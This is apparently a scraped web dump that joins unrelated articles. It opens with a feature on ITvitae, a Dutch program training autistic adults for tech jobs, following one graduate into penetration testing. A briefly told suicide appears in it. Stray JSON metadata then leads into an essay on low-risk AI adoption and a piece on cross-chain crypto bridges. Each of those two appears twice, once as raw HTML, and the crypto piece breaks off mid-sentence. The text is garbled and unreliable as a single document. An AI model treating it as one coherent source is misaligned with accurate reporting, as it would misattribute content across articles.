by cold-calling IT and software companies as well as by tapping the connections of his board members.\n\\\nThe co-founders believed ITvitae could generate revenue primarily by charging employers a recruiting fee for each hire. \n\\\nDe Bie believed employers would be willing to pay because the amount he proposed was less than the typical cost of specialized, third-party technical training for new or existing employees.\n\\\nThe first challenge was finding students. After winding their way through various government agencies, van Hofweegen and de Bie found de Winter, who worked near where they lived. \n\\\n“Do you know these types of people?” van Hofweegen asked her in 2013 after laying out the vision for ITvitae. She replied, “How many do you want?”\n\\\nAs the co-founders prepared to interview about 30 candidates for 11 slots, de Winter explained the potential pitfalls. Autistic people tend to process language literally, she told them, and might be unable to respond to classic prompts. \n\\\nThe question “what do you hope to get from your time at ITvitae?” might elicit a blank stare. That’s because, to an autistic person, there’s no basis for what the outcomes of the new program might be. Alternatively, the list of answers could be endless and paralyzing. \n\\\nThey needed something concrete and technical to discuss. So de Bie concocted a simple tool that would serve as a discussion topic and gauge applicants’ computer interest: He asked the candidates to draw maps of their home computer networks and be prepared to describe them.\n\\\nVan Hofweegen and de Bie were full of enthusiasm. But, as they continued to talk with de Winter, they realized how much they still had to learn about the very people they wanted to help. They were, perhaps, in over their heads.\n\\\nFor as long as he could remember, van Ruitenbeek knew he was different but felt that he couldn’t let other people know that. It was as if he were “living undercover,” he said. He was constantly afraid that asking the wrong question would cause him to be bullied, so he never asked questions.\n\\\nWhile his twin sister played with other children, he withdrew to solitary activities, learning to design his own websites on topics ranging from outer space to dinosaurs. But his life took a darker turn after his psychotic episode in Utrecht.\n\\\nVan Ruitenbeek had planned to spend the summer day catching up on coursework when suddenly he began to feel that he was outside his own body. \n\\\nHis vision narrowed and his mind compelled him to follow what he believed were secret hand signals made by strangers, which eventually directed him to a bar to order a draft Heineken. He then lurched outside the bar in a stupor. \n\\\nVan Ruitenbeek rambled in halting, slurred speech when his sister and father reached him by phone. Frantic with worry, Henk van Ruitenbeek drove through Utrecht and eventually found his son standing on a sidewalk, staring vacantly. He got him in the car and took him home.\n\\\nIn the aftermath, with a new diagnosis of autism, van Ruitenbeek believed his life was over. He had thought it was not rational or even possible to set goals for himself. Then de Winter mentioned ITvitae, and he knew he badly wanted a slot there. \n\\\nThe ITvitae interview, he later said, was “like a ticket out of my situation.” More nervous than he had ever been, he told himself: “I have to make it. I have to do my best.”\n\\\nThe interview, which took place in late 2013, was difficult for everyone. Although van Hofweegen and de Bie were pleasant and upbeat, van Ruitenbeek felt he was in “hostile territory.” \n\\\nThen again, everything beyond his parents’ home seemed that way at the time. \n\\\nHe stuttered severely when describing his recovery from psychosis, and it took him an uncomfortably long time to utter a single sentence. He was visibly perspiring. “This isn’t working,” de Bie thought.\n\\\nWhen de Bie pivoted to the network drawing and other technical questions, the interview shifted. Van Ruitenbeek stuttered less. De Bie, impressed by his remarks about website design, decided before the interview ended that van Ruitenbeek should have a space at ITvitae.\n\\\nDe Bie thought it was obvious that van Ruitenbeek — and most of the other candidates — had raw computer talent. Van Hofweegen welled with tears. “What are these wonderful people doing at home?” he wondered.\n\\\nAdvocates for people with autism in the United States often ask the same question. \n\\\nParents of autistic teenagers describe the “cliff” of high school or college graduation, marked by the struggle to navigate the transition from years of special education and support to independent working life. \n\\\nFirm data is hard to come by, but some estimates suggest millions of autistic American adults are unemployed or underemployed. Of those who find work, most are in low-wage and part-time jobs, according to Drexel’s Autism Institute.\n\\\nAt the same time, demand for workers with technical skills has far outpaced supply. In the cybersecurity field alone, the U.S. faces a shortfall of more than 225,000 workers, according to CyberSeek, an organization that provides job market data. \n\\\nThe number of available tech-related jobs in the U.S. nearly doubled from 2020 to 2021, analytics company Datapeople reported.\n\\\nOver the past decade, a variety of opportunities for autistic adults in the U.S. — ranging from technical training and job placement programs in various cities, to targeted hiring and retention efforts at large employers — have aimed to bridge the tech workforce gap. \n\\\nBut the results so far have been modest, said Michael Bernick, a San Francisco-based attorney who has written two books on employment strategies for the neurodiverse.\n\\\nThat’s partly because many initiatives expect job candidates to have higher education, credentials and the ability to work with minimal support, said Bernick, who was director of the California labor department from 1999 to 2004. “\n\\\nThey are looking for people who have significant tech skills,” he said. “Of that group, not all are college graduates, but they’re also not the long-term unemployed, sitting in their parents’ basements.” \n\\\nSomeone like van Ruitenbeek wouldn’t have stood a chance.\n\\\nOne widely publicized initiative is the Neurodiversity @ Work Employer Roundtable, a collection of about four dozen private employers — including Microsoft, SAP, Google and more — that foster neurodiversity hiring programs. \n\\\nParticipating companies offer screening and interview processes to accommodate autistic candidates; about 1,200 neurodiverse candidates have gotten jobs with Roundtable employers over the past decade, said Neil Barnett of Microsoft, a leader of the group. \n\\\nBarnett, who has discussed the initiative with Bernick, hopes that Roundtable employers will continue to expand their hiring of neurodiverse candidates with a variety of skills, including outside of tech.\n\\\nAutistic adults who are interested in computers represent just a sliver of autistic job seekers, according to the national advocacy organization Autism Speaks; Bernick puts the figure around 10% to 15%. \n\\\nDue in part to prominent figures such as Elon Musk, who has said he has Asperger’s syndrome, which is now considered a type of autism spectrum disorder, and pop culture caricatures of socially awkward workers in Silicon Valley, the notion that autistic people inherently possess extraordinary tech competencies has become a cliché. \n\\\nBernick said he once had hopes of a tech career for his own autistic son. But his son had neither uncommon skills nor a deep interest in computers.\n\\\nWhile the 10% to 15% estimated by Bernick may seem like a small slice relative to popular perception, efforts to employ that group are nonetheless important, especially given the dramatic need in the tech sector, advocates and researchers said. \n\\\nBernick said programs in the U.S. should expand their efforts to find autistic job seekers who have computer capabilities but lack the credentials — precisely the types of people van Hofweegen and de Bie recruited for their inaugural class.\n\\\nIn February 2014, after a six-month stint cutting yarn, van Ruitenbeek rode his bicycle to ITvitae’s space for the first day of class. He was nervous. In social settings, he always felt as though he were “from another planet,” he said. \n\\\nHere, though, he was surrounded by people who felt the same way.\n\\\nShortly after their arrival, de Bie assigned the students to assemble the furniture they would be using. When he returned several hours later, he found they had put it together flawlessly. \n\\\nHe asked how everyone was getting along and discovered that none of the students had bothered with introductions. De Bie was surprised and amused; he was still learning how autistic people function.\n\\\nVan Hofweegen and de Bie, who refused to use the word “disability,” told the students they had “different operating systems” than the neurotypical people they grew up with. \n\\\nIt helped to reassure them that they belonged in the classroom, and eventually the workplace, as they all began to “learn how to learn again” following what for some was years away from school, van Hofweegen said. \n\\\nDe Bie eased the students into a school setting by leading a training on basic Microsoft programming, networking and security. That was followed by a 40-day course on software testing offered by an organization that issues certifications for technical specialties in the Netherlands.\n\\\nAfter only a short time, van Ruitenbeek said he began to feel “at home for the first time in my life.” He enjoyed his coursework and excelled at it. He gradually began interacting with other students as he felt more at ease and less afraid of making social mistakes. \n\\\nWhen he grumbled about commuting by bike, a classmate offered to drive him to and from ITvitae. Van Ruitenbeek gladly accepted.\n\\\nYet, for all his progress, van Ruitenbeek continued to face obstacles. Conversation remained difficult due to his stutter, and he lacked the energy to work the 32-hour week that most employers expected of ITvitae’s graduates. \n\\\nSometimes his father worried it was all too much for him. He was one of three students for whom van Hofweegen struggled to find a job.\n\\\nWhen the coursework drew to a close, the students took a formal exam to be certified in software testing. Van Ruitenbeek breezed through the questions, except for one that confounded him: None of the multiple choice answers were technically correct. \n\\\nSo he selected the answer that he suspected the test-maker wanted. He picked correctly and scored 100%. “It was my first achievement,” van Ruitenbeek said. “I could do something.”\n\\\nA short time later, a director from the testing company visited ITvitae and van Hofweegen told him that a student had spotted a mistake in the exam. Van Hofweegen, who has an uncanny ability to sense an opportunity and pounce, suggested that van Ruitenbeek could be a test reviewer. \n\\\nThe company invited him to join a small group of volunteers who look over exams for accuracy and clarity. Van Ruitenbeek readily agreed. To prepare, he plowed through a textbook on ethical hacking.\n\\\nThe work led him to his next self-discovery: Ethical hacking was fun. Once unable to set goals for the future, van Ruitenbeek now dreamed of a career in cybersecurity. He would hunt for hidden vulnerabilities in software and networks, and prevent them from falling prey to malicious hackers.\n\\\nFollowing the success of their first class, van Hofweegen and de Bie recruited another class, then another, each with a maximum of 14 students. \n\\\nAfter the first year, with steady revenue generated mainly from fees paid by employers, the co-founders began taking salaries, and they hired additional staff. ITvitae’s mission spread to autistic job seekers and their supporters across the Netherlands.\n\\\nAs the organization grew, van Hofweegen and de Bie relocated ITvitae to a floor in a former monastery, which had been converted into offices. The founders thought its tree-shaded walking paths and seclusion would impart a serenity that the students needed. \n\\\nThe organization also began offering new courses in software development, data science and cybersecurity, all specialties in high demand. \n\\\nStudents delighted in being able to focus exclusively on topics that fascinated them, a luxury — for many of the students, a necessity — that traditional educational settings couldn’t provide.\n\\\nCertain similarities emerged among ITvitae’s students. Before joining, nearly half had been sitting at home, unemployed and socially isolated, for longer than two years. Many passed the time playing video games and lost track of whether it was day or night. \n\\\nThey told van Hofweegen and de Bie they felt worthless and never fit in; many reported having been bullied and struggling through periods of depression.\n\\\nITvitae turned away about two-thirds of applicants, most frequently because of untreated mental health issues. Other candidates simply weren’t ready. One 2022 applicant said he hadn’t left his home for 10 years and spent most of his time gaming. \n\\\n“It was such a big thing for him to be here” for the interview, de Bie said. “But then traveling regularly, studying in a group, doing exams — that would have been too heavy for him. I had to tell him it’s not the right time.”\n\\\nMale students at ITvitae outnumber female students 10 to 1, both because autism is more prevalent in men and more likely to go undiagnosed or misdiagnosed in women. Many experience sensory challenges, such as headaches if the light is too bright or if there’s too much noise. \n\\\nOne student was distracted by the sound of blinking eyelashes. Most struggle to varying degrees with communication.\n\\\nTo help both prospective employers and job candidates work through the inevitable miscommunications, ITvitae staff members accompanied students to job interviews. \n\\\nSaskia Meeuwessen, who was hired as the CEO of ITvitae as it expanded, recalled joining a student at an interview for a cybersecurity job with the Dutch National Police. \n\\\nThe interviewer asked the candidate to introduce himself. The student froze: It wasn’t a question he had practiced. Nonetheless, he was later invited for a second meeting with an interviewer who was more experienced in interacting with autistic people.\n\\\nThat interviewer sat down and, with no social niceties, asked, “When I type www.google.nl, what happens?” Meeuwessen thought to herself, “Well, Google shows up, what a silly question.” \n\\\nBut the candidate had a completely different reaction, launching into nuanced details about internet servers and connections. For 90 minutes, Meeuwessen “sat there, listening to stuff that I really didn’t understand,” she said. The candidate was hired on the spot.\n\\\nThanks in part to its gradually sloped coastline, the Netherlands is a popular landing spot for the underwater fiber optic cables connecting the United States and Europe. Fast, reliable and inexpensive internet connectivity has fostered a flourishing tech sector. \n\\\nBut that connectivity has negative consequences, too. Hackers who can’t rely on the fragile internet connections in their home countries use servers in the Netherlands to commit crimes.\n\\\nTo counter these hackers, the Dutch National Police established an elite force called the High Tech Crime Unit, or HTCU. \n\\\nThe unit has become renowned both for its success disrupting the operations of cyberattackers and for its innovative culture, which for years has included hiring unconventional candidates, including those with autism.\n\\\nIn 2017, at van Hofweegen’s urging, the HTCU brought on a graduate from ITvitae. He proved to be an open-source intelligence wizard. Another graduate followed. \n\\\nThen the floodgates opened, and about 30 ITvitae graduates were eventually hired to jobs in regional police squads, where they handle data analysis, digital forensics and other technical specialties.\n\\\nThe National Police’s embrace of a neurodiverse workforce extended beyond its partnership with ITvitae. Its most renowned hiring initiative for autistic employees began with a 2016 murder case.\n\\\nA 50-year-old Turkish man had been shot more than 30 times in the Dutch city of Leiden and died two days later. The National Police collected surveillance camera footage and quickly identified the suspects. \n\\\nTheir work also seemed to link the murder to a number of cold cases in Amsterdam. The National Police took over those investigations, inheriting 1,700 hours of camera footage. Watching the tapes was a marathon of drudgery that none of the National Police detectives wanted to take on.\n\\\nOne National Police detective, Jory de Groot, happened upon an idea. De Groot, who has a foster brother with Down syndrome, volunteered with a group that organized trips for young adults with disabilities. On a weekend shortly after the murder, she led a group of people with autism. \n\\\nDe Groot, then 26, described her job to one participant on the trip and mentioned the painstaking work of watching security footage. Some autistic people excel at recognizing small details, the woman told de Groot. They might love the very task that neurotypical detectives loathe.\n\\\nDe Groot then contracted four people from AutiTalent, a Dutch job placement organization for autistic people. She prepared her colleagues, advising them against asking typical get-to-know-you questions, and set up a radio-free office in a quiet corner of their building.\n\\\nWhen the autistic contractors arrived, the National Police detectives tested their abilities by having them watch the footage collected in the Leiden murder. \n\\\nThe detectives had already watched the tapes, which included the days leading up to the shooting, and knew precisely when the suspects would be seen on the day of the shooting.\n\\\nBefore long, one of the contractors spotted a suspect on the tape — but not when the detectives expected. The contractor found the suspect casing the crime scene the day before the attack. \n\\\nThe detectives had missed it. “It was really important evidence that we overlooked,” de Groot said. \n\\\nEventually, the two suspects were convicted in the Leiden murder.\n\\\nAs word of the feat reverberated through the National Police, requests for more AutiTalent contractors flooded in. Eventually, 50 autistic people were working as “camera footage specialists,” a newly created role, across the National Police.\n\\\n De Groot’s original team grew to six people, who increasingly talked with one another and with their police colleagues as they became more comfortable. \n\\\nThe contractors joined detectives from the start of investigations, rather than stepping in after they were already in progress, and took part in briefings. Additional contractors from AutiTalent became “audio specialists,” who transcribed interrogations and wiretaps.\n\\\nThe high profile of the contractors led some members of the National Police force to speak out about their own autism, which they’d previously hidden. \n\\\nThe outpouring prompted de Groot to work with those employees and an advocacy organization to establish an “Autism Embassy” at the National Police. \n\\\nNow about a dozen workplace “ambassadors” — employees with autism who volunteer for the role — offer an ear and advice to both autistic colleagues and their managers.\n\\\nThe National Police’s embrace of autistic contractors has been partially driven by government-proposed targets, accompanied by subsidies, for industry and government to hire 125,000 people who have difficulty finding work because of a disability. \n\\\nThat sort of government-centric approach is unlikely to occur in the U.S. Still, law enforcement agencies in the U.S. could draw lessons from the Dutch experiment, said Michael Bernick, the attorney who has focused on employment strategies for autistic people.\n\\\nAmid ITvitae’s successes, van Ruitenbeek was still floundering. He had enjoyed his time as a volunteer test reviewer in 2014, but it didn’t lead to a job. A subsequent internship with a computer security consultancy also didn’t land him permanent employment. \n\\\nYet another internship, with an organization that maintained supercomputers, failed when he experienced a psychotic episode in late 2016.\n\\\nIt happened when van Ruitenbeek was commuting to the company’s Amsterdam office by train. He knew public transportation was a stressor for him, but he thought he could push through it. He couldn’t. That day, he believed everyone on the train was talking about him. \n\\\nHe didn’t fully lose control, as he had in Utrecht. Still, he realized he couldn’t continue to commute and work normally with the organization any longer. He quit.\n\\\nIt had been more than two years since his ITvitae graduation, and van Ruitenbeek was again feeling hopeless. He mostly stayed at his parents’ home, where he tinkered with developing his own video game. \n\\\nHe sometimes rode his bike to ITvitae’s offices — “just as a place to go,” he said — where he read books on cybersecurity and tried to ground himself.\n\\\nVan Ruitenbeek happened to be at ITvitae one day in late 2017 when Pim Takkenberg, then a director at the Dutch cybersecurity firm Northwave and a former leader of the National Police’s High Tech Crime Unit, was there. \n\\\nEarlier that year, Takkenberg had overseen the development of a training program for ITvitae’s cybersecurity students. \n\\\nDuring the visit, van Hofweegen, ever scouting, made a request: “Pim, I have a person here, who is extremely vulnerable but extremely brilliant. I want you to talk to him.”\n\\\nAfter a brief chat, Takkenberg agreed to give van Ruitenbeek a “hack test” to assess his aptitude for penetration testing. The prospect alone was enough to help van Ruitenbeek regain some hope. \n\\\nA few months later, on exam day, Takkenberg instructed him to find vulnerabilities in a piece of software, which hackers could exploit to attack the hypothetical client. Takkenberg jokingly warned him not to cheat. \n\\\nVan Ruitenbeek took him literally, assuming he meant not to research anything on the internet. In reality, using the internet would have been allowed, even expected.\n\\\nVan Ruitenbeek found the main vulnerabilities. Takkenberg was impressed but remained skeptical. Van Ruitenbeek still had trouble with conversation, and he was able to work only three days a week. \n\\\nAddressing the doubts, van Hofweegen said: “You want a problem solved. He communicates better with computers than with people. In a technical world, it’s not so bad.”\n\\\nTakkenberg offered him a trial six-month internship. But he needed someone who could work 40 hours a week. They found a compromise. Van Ruitenbeek would start with three days a week, then gradually increase to five days. \n\\\nNorthwave also allowed van Ruitenbeek to work from home occasionally, a major concession before the pandemic. He went on a special diet and began exercising to improve his health and boost his energy. \n\\\nHe was determined to have a permanent place at Northwave, where he might finally gain the independence and fulfillment he’d long chased.\n\\\nOver their nearly nine years together as business partners, van Hofweegen and de Bie proved there was space in the labor market for people who had been overlooked by employers and who previously thought themselves to be shut out of the workforce. \n\\\nSince 2014, ITvitae has graduated and placed nearly 500 students in technical jobs spanning sectors from agriculture to chip manufacturing to law enforcement. \n\\\nBernick called that total “striking” and said, “We don’t have any company in the United States that comes near that number, even over a 10-year period.”\n\\\nDe Bie’s early assessment that employers would be willing to pay a fee to hire ITvitae’s graduates proved to be right. It costs the equivalent of $30,000 to educate, coach and find employment for each student. \n\\\nAbout a third of that is generated from tuition while the remainder comes from the employer.\n\\\nAs ITvitae’s Meeuwessen points out, autism doesn’t end when students gain employment. That’s why the organization provides regular coaching to help graduates navigate changes — anything from a new manager to a schedule shift — they perceive as disruptive and unsettling. \n\\\n“As soon as something happens, they start to doubt. If there’s doubt, they get unstable and that’s bad,” Meeuwessen said. “Most are doing just fine after many years, but it’s a process.”\n\\\nFor all the success, there have been setbacks. Even with coaching, some students struggle. ITvitae occasionally hears from an employer that a former student has stopped showing up to work and hasn’t responded to messages, sometimes for weeks. \n\\\n“We go to their houses,” van Hofweegen said. “We knock on the door. We call the parents. And we still can’t make them understand why they need to communicate with their employers.”\n\\\nA few times, the problems have been far more dire than an inability to show up at work. De Bie keeps a photo on his desk of a talented software programmer who specialized in a language called C#. After his graduation, he was hired by a prestigious global corporation. \n\\\nHis coach regularly checked in, and, by all appearances, his first few months at the company were successful. Then came word that the student had taken his life, one of three graduates to die by suicide. \n\\\nEven before graduating, the programmer had obtained an illegal drug from China with the intention of overdosing. He waited to take it. He wanted to finish his education and get a job to prove that he was capable of success. \n\\\n“For him, that was enough,” van Hofweegen said.\n\\\nWhen van Ruitenbeek started at Northwave in 2018, being in an office with other people scared him. Takkenberg knew that van Ruitenbeek wouldn’t be comfortable speaking to clients or even colleagues right away and tried to smooth the transition. \n\\\nHe and his team organized roles that accommodated van Ruitenbeek and other ITvitae graduates “in doing the things they’re good at and not doing the stuff they really hate to do.” \n\\\nSo, after van Ruitenbeek rooted out the vulnerabilities in a network, another colleague would meet with the client to explain the findings. \n\\\nThrough a government program for people who need work accommodations, de Winter helped van Ruitenbeek borrow a car so he could avoid the stress of public transportation.\n\\\nVan Ruitenbeek found an accepting culture at Northwave. He began to confide in colleagues, who looked after him. As van Ruitenbeek’s trust in them grew, he started asking questions and giving more than yes and no answers. \n\\\nHe successfully pursued a notoriously difficult, globally recognized certification for his line of work, which Takkenberg said was a “big sign” that the intern’s abilities were exceptional. \n\\\nOnce the internship ended, Takkenberg gave him a permanent job sniffing out gaps in software that could make it vulnerable to being penetrated by malicious hackers. \n\\\n“He is one of the best pen-testers we have,” Takkenberg said. “Because of his talent to focus and stay focused, he always will find the small details.”\n\\\nShortly after van Ruitenbeek started in his permanent position, he and Takkenberg discussed his goals for his first year. They decided van Ruitenbeek should find a CVE, short for common vulnerabilities and exposures, security flaws in software that are formally and publicly cataloged. \n\\\nTakkenberg was ecstatic when, by the midyear check-in, van Ruitenbeek had uncovered six. “OK, that goal is done,” Takkenberg said. “For the rest of the year, let’s focus on your social skills.”\n\\\nA short time later, van Ruitenbeek attended a company golf outing. Takkenberg, who retains the rough-around-the-edges demeanor of an ex-cop, joked that van Ruitenbeek would probably excel despite never having played. \n\\\n“We know you read eight books in a month for fun, Thomas,” he teased. “So you probably read a book about how to golf to prepare for this.” Van Ruitenbeek was able to recognize that Takkenberg was joking, something he’s sure would have eluded him in the past. \n\\\nIt was a revelation.\n\\\nThen, during a weekend retreat with his team, van Ruitenbeek carted along some records and a record player. Music had long been a passion that allowed him to express himself when he lacked the words to do so. \n\\\nOne evening, he worked up the courage to play records for about 15 of his colleagues. The airy, electronic music helped everyone relax. \n\\\nWord of his talent spread, and the next day, he found himself DJing a barbecue for Northwave’s entire cyber unit, more than 50 people.\n\\\nTakkenberg decided to splurge on a DJ booth for Northwave. He dubbed van Ruitenbeek the company’s official DJ and assigned him to play music at its Friday afternoon happy hours.\n\\\nVan Ruitenbeek became the center of Northwave’s social gatherings.\n\\\nVan Ruitenbeek spinning records at the company retreat Credit: Courtesy of Pim Takkenberg\nWhen COVID-19 hit, van Ruitenbeek found himself longing for the company of colleagues. \n\\\n“I mostly miss the casual chats,” he said of the days that he works from home, about half his schedule these days. “That is the biggest change of my life since Northwave,” he said. “Social development. Now I am outgoing.”\n\\\nVan Ruitenbeek has started mentoring a new autistic employee. He also began working with Northwave’s sales team to write proposals and even meet with clients. \n\\\nThat’s not to say there aren’t challenges. But now, when the workload feels too heavy, or he senses he’s becoming over-stressed, van Ruitenbeek asks for help. “I used to think I had to shoulder it on my own,” he said.\n\\\nNow 35, van Ruitenbeek is becoming financially independent. He received a promotion and raise. He leased his own car and, in 2021, with help from his family, van Ruitenbeek purchased a one-bedroom apartment just a short walk from them. \n\\\nGiving a tour of his new home, he showed off the view of a pond beyond the sliding doors of his living room. He had carefully organized scores of records on shelves below his DJ equipment. \n\\\nTucked away in a corner, he displayed the artifacts of his period of isolation: shelves filled with the Warhammer figurines he painted as he recovered from his psychosis.\n\\\nIf you meet van Ruitenbeek today, you wouldn’t likely guess his history. Compact and ruddy, he makes eye contact when he speaks — in fluent English when he was interviewed for this article — and is often self-deprecating and quick to smile. \n\\\nHis easy banter with his father, a reliable source of support, encouragement and protection, was unimaginable in the aftermath of his psychosis a decade ago.\n\\\nWhen he entered the working world, van Ruitenbeek had to consciously mimic social behavior and speech that he observed in peers. \n\\\nOver time, though, being social gradually became second nature. He felt like a foreign language student who once had to rehearse sentences in his mind but eventually spoke the new language fluently.\n\\\nIn April, van Ruitenbeek attended the graduation of this year’s cybersecurity class at ITvitae’s monastery, sitting among the new graduates’ families and friends on a drizzly afternoon. \n\\\nAn ITvitae manager named Jessica van der Ploeg told the 11 new graduates, who were going on to jobs at global bank ING, consulting giant Deloitte and the Dutch Ministry of Defense, “The job market is waiting for you, for your talent and for who you are.”\n\\\nVan der Ploeg acknowledged that many incoming ITvitae students feel shut out of society because of their autism, just as van Ruitenbeek once did. \n\\\nAlluding to an analogy ITvitae often uses to describe the communication gap between people with autism and their neurotypical peers, she said, “It’s us Windows users who sometimes don’t know how Linux works.”\n\\\nVan Ruitenbeek listened intently. At various points in his life, he had been unable to express emotion. Now he had tears streaming down his face.\nPhoto by Sigmund on Unsplash","dc:creator":"Pro Publica","content":"An estimated 100,000 autistic Americans turn 18 every year, according to Drexel University’s Autism Institute.

I'm going to talk about a couple of ways that organizations and companies can adopt AI more easily. </p>\n<p>\\\nMore specifically, I'm going to talk about two areas of machine learning which I believe can be very easily integrated into existing systems and infrastructures, independent of the industry or the company, and can very quickly add value.</p>\n<h2 id=\"risksbehindaiadoption\">Risks Behind AI Adoption</h2>\n<p>One of the challenges behind AI adoption is that there are significant risks and this makes many companies hesitant to adopt AI.</p>\n<p>\\</p>\n<ol>\n<li><p>One of the major risks is obviously the risk of hiring. If you hire the wrong person or people, then you will have incurred a huge waste of time and money.</p>\n<p>\\</p></li>\n<li><p>Another issue is that a company might not be ready for the adoption of AI in terms of the culture. Unless the senior executives buy into AI, but also the middle layers, then it's very unlikely that AI can work well. </p>\n<p>\\\nAnd this is one of the topics that I've discussed and talked about a lot in my work, also in my book&nbsp;<a href=\"https://thedatascientist.com/decision-makers-handbook-data-science/\">The Decision Makers Handbook to Data Science</a>. And unless a company has the right culture for AI, it's very likely going to fail AI adoption. So that being said, companies might be hesitant to adopt AI, and then this creates a culture of fear and the problem perpetuates itself.</p>\n<p>\\</p></li>\n</ol>\n<p>Some other risks are obviously the risks of breaking things, right? So, if you're a company that has been going on for 20 or 30 years, maybe you're running some legacy systems and rebuilding these systems in a way that they can integrate with AI. </p>\n<p>\\\nWhether we're talking about a product or developing another platform internally in one way or another, there might not be a huge incentive to make these changes because you're afraid you must break things. </p>\n<p>\\\nAnd this is why, if an organization is very defensive around the adoption of AI, it's very important to start with some&nbsp;<a href=\"https://tesseract.academy/the-importance-of-c-suite-buy-in-for-ai-success/\">use cases</a>&nbsp;which are easy to understand, they're easy to implement, and the management, upper management, and mid-level management can easily understand and they support.</p>\n<p>\\\nThat's why, unfortunately, many AI initiatives fail; whether we're talking about products or services because, sometimes, service providers or product developers pitch ideas.

I'm going to talk about a couple of ways that organizations and companies can adopt AI more easily. \n\\\nMore specifically, I'm going to talk about two areas of machine learning which I believe can be very easily integrated into existing systems and infrastructures, independent of the industry or the company, and can very quickly add value.\nRisks Behind AI Adoption\nOne of the challenges behind AI adoption is that there are significant risks and this makes many companies hesitant to adopt AI.\n\\\n\n\nOne of the major risks is obviously the risk of hiring. If you hire the wrong person or people, then you will have incurred a huge waste of time and money.\n\\\nAnother issue is that a company might not be ready for the adoption of AI in terms of the culture. Unless the senior executives buy into AI, but also the middle layers, then it's very unlikely that AI can work well. \n\\\nAnd this is one of the topics that I've discussed and talked about a lot in my work, also in my book The Decision Makers Handbook to Data Science. And unless a company has the right culture for AI, it's very likely going to fail AI adoption. So that being said, companies might be hesitant to adopt AI, and then this creates a culture of fear and the problem perpetuates itself.\n\\\nSome other risks are obviously the risks of breaking things, right? So, if you're a company that has been going on for 20 or 30 years, maybe you're running some legacy systems and rebuilding these systems in a way that they can integrate with AI. \n\\\nWhether we're talking about a product or developing another platform internally in one way or another, there might not be a huge incentive to make these changes because you're afraid you must break things. \n\\\nAnd this is why, if an organization is very defensive around the adoption of AI, it's very important to start with some use cases which are easy to understand, they're easy to implement, and the management, upper management, and mid-level management can easily understand and they support.\n\\\nThat's why, unfortunately, many AI initiatives fail; whether we're talking about products or services because, sometimes, service providers or product developers pitch ideas. Companies that might seem a little bit too far out there. \n\\\nMaybe the valuation is not clear, or maybe adopting these technologies would require a significant change in the culture or the infrastructure layer of a company.\nTwo Types of Technologies\nThere are two types of technologies that I believe can very easily add value without much effort. And these two technologies are:\nAnomaly Detection\nThe term anomaly detection refers to a class of methods and algorithms in machine learning which are used to identify points that are, in a sense, unusual. These are points that do not seem to follow the regular patterns of behavior. \n\\\nAnd the thing with anomaly detection is that it can be very useful in contexts like fraud but can also be used in other domains like manufacturing.

Shamil Khalilov is the founder and CTO of the protocol. He has spent the last two years focussing exclusively on building bridges on layer-2 networks in order to address the liquidity issue that many well-known bridging protocols face.</p>\n<p>\\\nShamil also played a major role in developing the Neutrino Protocol, an algorithmic price-stable assetization protocol. It enables the creation of stablecoins pegged to real-world assets such as commodities and national currencies.</p>\n<p>\\\n<em>More in-depth information about Neutrino can be found on their <a href=\"https://medium.com/@neutrinoteam\">page</a>.</em></p>\n<h2 id=\"layer2crosschainbridges\">Layer 2 Cross-Chain Bridges</h2>\n<p>Cross-chain bridges enable the transfer of data and digital assets across different blockchains. Blockchains typically operate in silos and cannot interact with other blockchain ecosystems.</p>\n<p>\\</p>\n<blockquote>\n  <p>Cross-chain bridges help users access and interact with dApps on different blockchains, thus facilitating a more  interoperable Web3 ecosystem. Layer 2 cross-chain bridges are – obviously – bridges built on Layer 2 blockchains.</p>\n</blockquote>\n<p>\\\nLayer 2 blockchains are secondary networks built on top of underlying layer-1 protocols. Some examples of layer-2 blockchains include the&nbsp;<a href=\"https://lightning.network/\">Lightning Network</a>, which is built on top of&nbsp;<a href=\"https://developer.bitcoin.org/devguide/block_chain.html\">Bitcoin</a>; and Polygon or&nbsp;<a href=\"https://www.metis.io/\">Metis</a>, which are built on top of&nbsp;<a href=\"https://ethereum.org/en/developers/docs/intro-to-ethereum/\">Ethereum</a>.</p>\n<p>\\\nThese layer-2 networks help to ease congestion on the networks they are built on, thus improving the efficiency and overall scalability of the system.</p>\n<p>\\\n<em>A more detailed explanation of layer 1s and layer 2s can be found in&nbsp;<a href=\"https://thedefiant.io/what-are-layer-1s-and-layer-2s\">this article</a>.</em></p>\n<p>\\\nIn his presentation, Shamil highlights some of the biggest challenges related to cross-chain bridges. He introduces popular examples of cross-chain bridges like&nbsp;<a href=\"https://docs.wormhole.com/wormhole/\">Wormhole</a>&nbsp;and&nbsp;<a href=\"https://docs.multichain.org/getting-started/introduction\">Multichain</a>, and explains how these protocols address those issues.</p>\n<h2 id=\"wormholesrecursivewrappingproblemexplained\">Wormhole’s Recursive Wrapping Problem: Explained</h2>\n<p>Wormhole is a cross-chain bridge built on&nbsp;<a href=\"https://docs.solana.com/introduction\">Solana</a>. The protocol bridges assets by locking users’ assets in smart contracts and minting new wrapped tokens on the destination chain.</p>\n<p>\\</p>\n<blockquote>\n  <p>Wrapped tokens are tokens that have their value pegged to other cryptocurrencies that are native to other blockchains.</p>\n</blockquote>\n<p>\\\nAn example of a wrapped token is Wrapped Bitcoin (WBTC) - an ERC20 token on the Ethereum Blockchain. WBTC brings the ability to trade BTC on other blockchains like Ethereum and Solana.

Shamil Khalilov is the founder and CTO of the protocol. He has spent the last two years focussing exclusively on building bridges on layer-2 networks in order to address the liquidity issue that many well-known bridging protocols face.\n\\\nShamil also played a major role in developing the Neutrino Protocol, an algorithmic price-stable assetization protocol. It enables the creation of stablecoins pegged to real-world assets such as commodities and national currencies.\n\\\nMore in-depth information about Neutrino can be found on their page.\nLayer 2 Cross-Chain Bridges\nCross-chain bridges enable the transfer of data and digital assets across different blockchains. Blockchains typically operate in silos and cannot interact with other blockchain ecosystems.\n\\\n\n  \nCross-chain bridges help users access and interact with dApps on different blockchains, thus facilitating a more  interoperable Web3 ecosystem. Layer 2 cross-chain bridges are – obviously – bridges built on Layer 2 blockchains.\n\\\nLayer 2 blockchains are secondary networks built on top of underlying layer-1 protocols. Some examples of layer-2 blockchains include the Lightning Network, which is built on top of Bitcoin; and Polygon or Metis, which are built on top of Ethereum.\n\\\nThese layer-2 networks help to ease congestion on the networks they are built on, thus improving the efficiency and overall scalability of the system.\n\\\nA more detailed explanation of layer 1s and layer 2s can be found in this article.\n\\\nIn his presentation, Shamil highlights some of the biggest challenges related to cross-chain bridges. He introduces popular examples of cross-chain bridges like Wormhole and Multichain, and explains how these protocols address those issues.\nWormhole’s Recursive Wrapping Problem: Explained\nWormhole is a cross-chain bridge 